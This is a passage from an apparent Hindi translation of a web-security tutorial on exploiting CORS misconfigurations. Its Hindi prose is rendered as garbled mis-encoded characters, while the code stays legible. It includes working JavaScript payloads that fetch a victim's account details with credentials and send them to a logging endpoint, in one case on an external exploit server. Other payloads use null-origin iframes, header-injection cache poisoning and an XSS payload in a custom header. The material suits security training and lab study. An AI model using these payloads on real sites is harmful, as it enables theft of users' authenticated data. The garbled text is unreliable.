рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдореЗрдВ рдпрд╣ рд╣реЛ рдирд╣реАрдВ рд╕рдХрддрд╛ рдХреНрдпреЛрдВрдХрд┐ **рдЗрди 2 рдорд╛рдиреЛрдВ рдХреЗ headers рдХреЛ рдПрдХ рд╕рд╛рде рдирд┐рд╖рд┐рджреНрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред**\
рдпрд╣ рднреА рд╕рдЪ рд╣реИ рдХрд┐ рдмрд╣реБрдд рд╕реЗ рдбреЗрд╡рд▓рдкрд░реНрд╕ **CORS рдореЗрдВ рдХрдИ URLs рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**, рд▓реЗрдХрд┐рди рд╕рдмрдбреЛрдореЗрди рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдбреНрд╕ рдпрд╛ URLs рдХреА рд╕реВрдЪрд┐рдпреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИред рддрдм, рдХрдИ рдбреЗрд╡рд▓рдкрд░реНрд╕ **рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ** \*\*`Access-Control-Allow-Origin`\*\*header **рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╣реИрдВ**, рдФрд░ рдХрдИ рдмрд╛рд░ рд╡реЗ рдмрд╕ **Origin header рдХреЗ рдорд╛рди рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рддреЗ рд╣реИрдВред**

рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, **рд╡рд╣реА рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред**

рдЕрдиреНрдп рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдбреЗрд╡рд▓рдкрд░ рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдбреЛрдореЗрди** (_victimdomain.com_) **Origin header рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ**, рддрдм, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **`attackervictimdomain.com`** рдирд╛рдордХ рдбреЛрдореЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧреЛрдкрдиреАрдп рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИред
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` рдореВрд▓ (Origin)

`null` **Origin** рд╣реЗрдбрд░ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рдорд╛рди рд╣реИред рд╡рд┐рдирд┐рд░реНрджреЗрд╢рди рдореЗрдВ рдЗрд╕реЗ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕ рдФрд░ рд╕реНрдерд╛рдиреАрдп HTML рдлрд╛рдЗрд▓реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛рдиреЗ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рд╣реИред рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдерд╛рдиреАрдп рд╡рд┐рдХрд╛рд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `null` рдореВрд▓ рдХреЛ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣ рдЕрдЪреНрдЫрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдХрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рдорд╛рди рдХреЛ CORS рдореЗрдВ рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ** рдФрд░ рдХреЛрдИ рднреА **рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЖрд╕рд╛рдиреА рд╕реЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб iframe рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ null рдореВрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреА рд╣реИ**:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### **Regexp рдмрд╛рдпрдкрд╛рд╕**

рдпрджрд┐ рдЖрдкрдиреЗ рдкрд╛рдпрд╛ рдХрд┐ рдбреЛрдореЗрди _victim.com_ рдХреЛ **whitelisted** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ _victim.com.**attacker.com**_ рднреА **whitelisted** рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдпрд╛, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕рдмрдбреЛрдореЗрди рдХреЛ **takeover** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ _**somesubdomain**.victim.com_ whitelisted рд╣реИ рдпрд╛ рдирд╣реАрдВред

### **Advance Regexp рдмрд╛рдпрдкрд╛рд╕**

рдЕрдзрд┐рдХрд╛рдВрд╢ regex рдЬреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрджрд░ рдбреЛрдореЗрди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрддреЗ рд╣реИрдВ, рд╡реЗ alphanumeric ASCII рдЕрдХреНрд╖рд░реЛрдВ рдФрд░ `.-` рдкрд░ рдХреЗрдВрджреНрд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, Origin рд╣реЗрдбрд░ рдореЗрдВ `victimdomain.com{.attacker.com` рдЬреИрд╕рд╛ рдХреБрдЫ regexp рджреНрд╡рд╛рд░рд╛ `victimdomain.com` рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рд▓реЗрдХрд┐рди рдмреНрд░рд╛рдЙрдЬрд╝рд░ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ Safari рдЗрд╕ рдЕрдХреНрд╖рд░ рдХреЛ рдбреЛрдореЗрди рдореЗрдВ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ) `attacker.com` рдбреЛрдореЗрди рддрдХ рдкрд╣реБрдВрдЪреЗрдЧрд╛ред

`_` рдЕрдХреНрд╖рд░ (рд╕рдмрдбреЛрдореЗрдиреНрд╕ рдореЗрдВ) рдХреЗрд╡рд▓ Safari рдореЗрдВ рд╣реА рдирд╣реАрдВ, рдмрд▓реНрдХрд┐ Chrome рдФрд░ Firefox рдореЗрдВ рднреА рд╕рдорд░реНрдерд┐рдд рд╣реИ!

**рддрдм, рдЙрди рд╕рдмрдбреЛрдореЗрдиреНрд╕ рдореЗрдВ рд╕реЗ рдПрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдХреБрдЫ "рд╕рд╛рдорд╛рдиреНрдп" regexps рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ URL рдХреЗ рдореБрдЦреНрдп рдбреЛрдореЗрди рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВред**

**рдЗрд╕ рдмрд╛рдпрдкрд╛рд╕ рдХреА рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **рдФрд░** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### рд╕рдмрдбреЛрдореЗрди рдХреЗ рдЕрдВрджрд░ XSS рд╕реЗ

CORS рд╢реЛрд╖рдг рдХреЗ рдЦрд┐рд▓рд╛рдл рдПрдХ рд░рдХреНрд╖рд╛рддреНрдордХ рддрдВрддреНрд░ рдЬреЛ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рддреЗ рд╣реИрдВ, рд╡рд╣ рд╣реИ рдЙрди рдбреЛрдореЗрдиреНрд╕ рдХреЛ white-list рдХрд░рдирд╛ рдЬреЛ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдмрд╛рд░-рдмрд╛рд░ рдПрдХреНрд╕реЗрд╕ рдХреА рдорд╛рдВрдЧ рдХрд░рддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдкреВрд░реА рддрд░рд╣ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ **whitelisted** рдбреЛрдореЗрди рдХрд╛ **рдПрдХ рднреА** рд╕рдмрдбреЛрдореЗрди **XSS** рдЬреИрд╕реЗ рдЕрдиреНрдп рд╢реЛрд╖рдгреЛрдВ рдХреЗ рд▓рд┐рдП **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╣реИ, рддреЛ рдпрд╣ CORS рд╢реЛрд╖рдг рдХреЛ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб _requester.com_ рдХреЗ рд╕рдмрдбреЛрдореЗрдиреНрд╕ рдХреЛ _provider.com_ рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИред
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
{
//Access data
else{ // unauthorized access}
}
```
### **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ**

рдпрджрд┐ рд╕рдВрдпреЛрдЧ рд╕реЗ рд╕рдм рдХреБрдЫ рдЕрдиреБрдХреВрд▓ рд╣реЛ, рддреЛ рд╣рдо HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ [рд╕рдВрдЧреНрд░рд╣рд┐рдд XSS](https://portswigger.net/web-security/cross-site-scripting/stored) рднреЗрджреНрдпрддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдХреЛрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **Origin рд╣реЗрдбрд░** рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЗрд╕реЗ рдЕрд╡реИрдз рдЕрдХреНрд╖рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪреЗ, рддреЛ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ **IE/Edge рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рднреЗрджреНрдпрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Internet Explorer рдФрд░ Edge \r (0x0d) рдХреЛ рдорд╛рдиреНрдп HTTP рд╣реЗрдбрд░ рд╕рдорд╛рдкреНрддрд┐ рдорд╛рдирддреЗ рд╣реИрдВ**:`GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

Internet Explorer рдЗрд╕ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджреЗрдЦрддрд╛ рд╣реИ:

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

рдпрд╣ рд╕реАрдзреЗ рддреМрд░ рдкрд░ рднреЗрджреНрдп рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдпрд╣ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ рдХрд┐ рд╡рд╣ рдХрд┐рд╕реА рдХреЗ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдЗрд╕ рддрд░рд╣ рдХрд╛ рджреЛрд╖рдкреВрд░реНрдг рд╣реЗрдбрд░ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХреЗ, рд▓реЗрдХрд┐рди рдореИрдВ **Burp Suite рдореЗрдВ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдореИрдиреНрдпреБрдЕрд▓реА рддреИрдпрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ рдФрд░ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдЗрд╕ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рд╣реЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрдиреНрдп рд▓реЛрдЧреЛрдВ рдХреЛ рдкрд░реЛрд╕ рд╕рдХрддрд╛ рд╣реИ**ред рдореИрдВрдиреЗ рдЬреЛ рдкреЗрд▓реЛрдб рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рд╣реИ рд╡рд╣ рдкреГрд╖реНрда рдХреЗ рдЪрд░рд┐рддреНрд░ рд╕реЗрдЯ рдХреЛ **UTF-7** рдореЗрдВ рдмрджрд▓ рджреЗрдЧрд╛, рдЬреЛ XSS рднреЗрджреНрдпрддрд╛рдУрдВ рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЦреНрдпрд╛рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИред

### **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ**

рдЖрдкрдиреЗ рдХрднреА-рдХрднреА рдПрдХ рдкреГрд╖реНрда рджреЗрдЦрд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдХрд╕реНрдЯрдо HTTP рд╣реЗрдбрд░ рдореЗрдВ [рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) рд╣реЛрддрд╛ рд╣реИред рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХрд┐рд╕реА рдХрд╕реНрдЯрдо рд╣реЗрдбрд░ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд┐рдирд╛ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреЗ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рддрд╛ рд╣реИ:
```http
GET / HTTP/1.1
Host: example.com
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK
Access-Control-Allow-Origin: \*
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
CORS рдХреЗ рд╕рд╛рде, рд╣рдо Header рдореЗрдВ рдХреЛрдИ рднреА рдорд╛рди рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдкрдиреЗ рдЖрдк рдореЗрдВ, **рдпрд╣ рдмреЗрдХрд╛рд░ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд╛рд░рд╛ **рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ JavaScript рдкреНрд░рджрд░реНрд╢рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдЕрдЧрд░ Vary: Origin рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рддреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдХреИрд╢ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛ рд╕рдХрддреА рд╣реИ рдФрд░ рдЬрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕рдВрдмрдВрдзрд┐рдд URL рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рддрд╛ рд╣реИ рддреЛ рд╕реАрдзреЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**ред рдореИрдВрдиреЗ рдПрдХ fiddle рдмрдирд╛рдпрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк [рдЕрдкрдиреА рдкрд╕рдВрдж рдХреЗ URL рдкрд░ рдпрд╣ рд╣рдорд▓рд╛ рдЖрдЬрдорд╛ рд╕рдХреЗрдВ](https://jsfiddle.net/3gk8u8wu/3/)ред рдЪреВрдВрдХрд┐ рдпрд╣ рд╣рдорд▓рд╛ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдХреИрд╢рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд╛рдлреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╣реИред
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## рдмрд╛рдЗрдкрд╛рд╕

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI рдПрдХ рдкреНрд░рдХрд╛рд░ рдХреА рдХрдордЬреЛрд░реА рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдЬреЛ рдЗрд╕ рддрдереНрдп рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреА рд╣реИ рдХрд┐, рдЬрдм `script` рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдИ рд╕рдВрд╕рд╛рдзрди рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ SOP рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ `script` рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢рд╛рдорд┐рд▓ рдХреА рдЧрдИ рд╕рднреА рдЪреАрдЬреЛрдВ рдХреЛ рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддрдм рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдбрд╛рдпрдирд╛рдорд┐рдХ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ JSONP рдХреА рдмрд╛рдд рдЖрддреА рд╣реИ рдЬрдм рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдХреБрдХреАрдЬ рдЬреИрд╕реА рд╡рд╛рддрд╛рд╡рд░рдг-рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдХреБрдХреАрдЬ рдХреЛ рдПрдХ рдЕрд▓рдЧ рд╣реЛрд╕реНрдЯ рд╕реЗ рд╕рдВрд╕рд╛рдзрди рдХреА рдорд╛рдВрдЧ рдХрд░рддреЗ рд╕рдордп рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред BurpSuite рдкреНрд▓рдЧрдЗрди: [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

[**рдпрд╣рд╛рдВ XSSI рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░реЛрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдкрдврд╝реЗрдВред**](xssi-cross-site-script-inclusion.md)

рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ **`callback`** **рдкреИрд░рд╛рдореАрдЯрд░** рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдкреЗрдЬ рдбреЗрдЯрд╛ рдХреЛ JSONP рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред рдРрд╕реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдкреЗрдЬ рдбреЗрдЯрд╛ рдХреЛ `Content-Type: application/javascript` рдХреЗ рд╕рд╛рде рд╡рд╛рдкрд╕ рднреЗрдЬреЗрдЧрд╛ рдЬреЛ CORS рдиреАрддрд┐ рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░реЗрдЧрд╛ред

![](<../.gitbook/assets/image (229).png>)

### рдЖрд╕рд╛рди (рдмреЗрдХрд╛рд░?) рдмрд╛рдЗрдкрд╛рд╕

рдЖрдк рдПрдХ рд╡реЗрдм-рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╡рд╣ рдЖрдкрдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░реЗ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд╛рдкрд╕ рднреЗрдЬреЗред рдЗрд╕рд╕реЗ **`Access-Control-Allow-Origin`** рдмрд╛рдЗрдкрд╛рд╕ рд╣реЛ рдЬрд╛рдПрдЧрд╛ рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЕрдВрддрд┐рдо рдкреАрдбрд╝рд┐рдд рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд╣реАрдВ рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗ** рдХреНрдпреЛрдВрдХрд┐ рдЖрдк **рдПрдХ рдЕрд▓рдЧ рдбреЛрдореЗрди рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░реЗрдВрдЧреЗ** (рдЬреЛ рдЖрдкрдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛)ред

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escape рдПрдХ **рдкреНрд░реЙрдХреНрд╕реА** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╣рдорд╛рд░реЗ **рдЕрдиреБрд░реЛрдз** рдХреЛ рдЗрд╕рдХреЗ **рд╣реЗрдбрд░реНрд╕** рдХреЗ рд╕рд╛рде **рдкрд╛рд╕** рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдпрд╣ **Origin** рд╣реЗрдбрд░ рдХреЛ рднреА **рд╕реНрдкреВрдл** рдХрд░рддрд╛ рд╣реИ (Origin = **рдЕрдиреБрд░реЛрдзрд┐рдд рдбреЛрдореЗрди**). рдЗрд╕ рдкреНрд░рдХрд╛рд░ **CORS рдиреАрддрд┐ рдмрд╛рдЗрдкрд╛рд╕ рд╣реЛ рдЬрд╛рддреА рд╣реИ**ред\
рд╕реНрд░реЛрдд рдХреЛрдб [Github рдкрд░ рд╣реИ](https://github.com/shalvah/cors-escape), рдЗрд╕рд▓рд┐рдП рдЖрдк **рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рд╣реЛрд╕реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

рдкреНрд░реЙрдХреНрд╕реА рдХрд╛ рдорддрд▓рдм рд╣реИ "рдЖрдкрдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдЖрдЧреЗ рдмрдврд╝рд╛рдирд╛", рдЬреИрд╕рд╛ рдХрд┐ рдЖрдкрдиреЗ рднреЗрдЬрд╛ рдерд╛ред рд╣рдо рдЗрд╕реЗ рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рддрд░реАрдХреЗ рд╕реЗ рд╣рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдЕрднреА рднреА рдХрд┐рд╕реА рдФрд░ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕ рдмрд╛рд░, **рдЖрдкрдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдЖрдЧреЗ рдмрдврд╝рд╛рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рд╕рд░реНрд╡рд░ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЬреЛ рднреА рдкреИрд░рд╛рдореАрдЯрд░ рдЖрдкрдиреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рд╣реИрдВ рдЙрд╕рдХреЗ рд╕рд╛рдеред**

### Iframe + Popup Bypass

